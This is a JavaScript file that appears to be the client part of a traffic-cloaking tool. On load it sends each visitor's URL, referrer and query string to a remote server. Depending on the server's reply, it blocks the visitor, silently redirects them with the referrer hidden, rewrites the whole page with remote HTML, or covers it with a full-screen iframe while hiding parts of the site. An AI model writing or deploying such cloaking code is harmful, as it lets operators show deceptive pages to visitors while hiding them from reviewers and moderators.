(function () {
    let domain = '{DOMAIN}';
    let xhr = new XMLHttpRequest();
    xhr.withCredentials = true;

    let delimiter = '?';
    let reason = '{REASON}';
    let url = domain + 'js/jsprocessing.php';
    if (reason !== '') { url += delimiter + reason; delimiter = '&' }
    url += delimiter + "uri=" + escape(window.location.href);
    delimiter = '&';
    let referrer = escape(document.referrer);
    if (referrer !== '') {
        url += delimiter+"referrer=" + referrer;
    }
    if (window.location.search !== '') {
        url += delimiter + window.location.search.substring(1);
    }

    xhr.open("GET", url, true);
    xhr.onload = function () {
        if (xhr.status !== 200) {
            console.log("An error occured: " + xhr.status);
            return;
        }

        let action = xhr.getResponseHeader("YWBAction");
        switch (action) {
            case "none":
                console.log('You are not allowed to go futher!');
                return;
            case "redirect":
                let loc = xhr.getResponseHeader("YWBLocation");
                //console.log(loc);
                document.open();
                document.write('<html><head>');
                document.write('<meta name="referrer" content="never" />');
                document.write('<meta http-equiv="refresh" content="0; url=' + loc + '" />');
                document.write('</head></html>');
                document.close();
                break;
            case "replace":
                document.open();
                let docText = !xhr.responseText.includes('<base')?
                    xhr.responseText.replace('<head>',
                        '<head><base href="https://' + domain + '"/>'):
                    xhr.responseText;
                document.write(docText);
                document.close();
                break;
            case "iframe":
                let frameText = !xhr.responseText.includes('<base')?
                    xhr.responseText.replace('<head>',
                        '<head><base href="https://' + domain + '"/>'):
                    xhr.responseText;
                showIframe(frameText);
                break;
        }
    };
    xhr.send();
})();

function showIframe(html) {
    function hideElementDelayed(selector) {
        let interval = setInterval(function () {
            let element = document.querySelector(selector);
            if (element) {
                element.innerHTML = '';
                clearInterval(interval);
            }
        }, 820);
    }

    function appendElement(element) {
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.border = '0';
        document.body.style.height = '100%';
        document.body.style.background = 'rgba(0,0,0,0)';
        document.querySelector('html').style.background = 'rgba(0,0,0,0)';
        document.body.appendChild(element);
        hideElementDelayed('#gtranslate_wrapper .switcher');
        hideElementDelayed('.ak-master-sales-pop');
        hideElementDelayed('.sticky');
    }

    let container = document.createElement('div');
    let iframe = document.createElement('iframe');
    iframe.setAttribute('srcdoc', html);
    iframe.style.border = '0';
    iframe.style.margin = '0';
    iframe.style.padding = '0 auto';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.overflow = 'hidden';

    container.style.border = '0';
    container.style.padding = '0';
    container.style.margin = '0 auto';
    container.style.width = '100%';
    container.style.height = '100vh';
    container.appendChild(iframe);

    if (document.body) {
        appendElement(container);
    } else {
        document.addEventListener('DOMContentLoaded', function () {
            appendElement(container);
        });
    }
}